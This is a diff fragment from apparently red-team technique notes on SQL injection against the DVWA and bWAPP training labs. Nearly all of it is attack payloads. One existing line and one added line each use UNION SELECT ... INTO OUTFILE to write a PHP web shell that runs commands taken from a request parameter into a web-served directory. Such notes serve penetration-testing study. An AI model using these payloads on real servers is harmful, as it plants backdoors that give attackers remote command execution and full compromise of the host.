@@ -53,6 +53,8 @@ mysql> insert into accounts (username, password, mysignature) values ('admin','m
 
 ```sql
 mysql> select * from users where user_id = 1 union select all 1,2,3,4,"<?php system($_REQUEST['c']);?>",6 into outfile "/var/www/dvwa/shell.php" #;
+
+a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/bWAPP/images/yabadooo.php" -- -
 ```
 
 ![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/.gitbook/assets/Screenshot%20from%202018-11-17%2019-15-16.png)
